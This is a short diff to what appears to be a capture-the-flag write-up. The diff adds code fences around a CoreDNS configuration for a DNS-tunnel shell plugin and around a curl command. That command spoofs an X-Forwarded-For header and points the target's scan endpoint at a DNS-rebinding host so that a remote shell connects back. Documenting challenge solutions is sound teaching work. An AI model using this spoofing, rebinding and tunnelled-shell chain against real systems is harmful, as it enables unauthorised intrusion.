@@ -24,7 +24,7 @@ The hint for the challenge says `DeNiS Sergeev wants a secret mission payload.`,
 1) Run coredns with the https://github.com/adc/coredns-tunnelshell plugin installed. 
 
 You can use a configuration like this:
-
+```
 tunnel.yourdomain.com {
   hosts {
 	95.173.136.72 kgb.tunnel.yourdomain.com
@@ -38,8 +38,11 @@ tunnel.yourdomain.com {
   errors
 }
 
+```
 
+```
 curl -H "X-Forwarded-For: 95.173.136.71" kgb.target:15555/scan?url=http://0x0y0z.d5184c01.rbndr.us/
+```
 
 
 2) Connect to the coredns socket and wait for a connection to show up
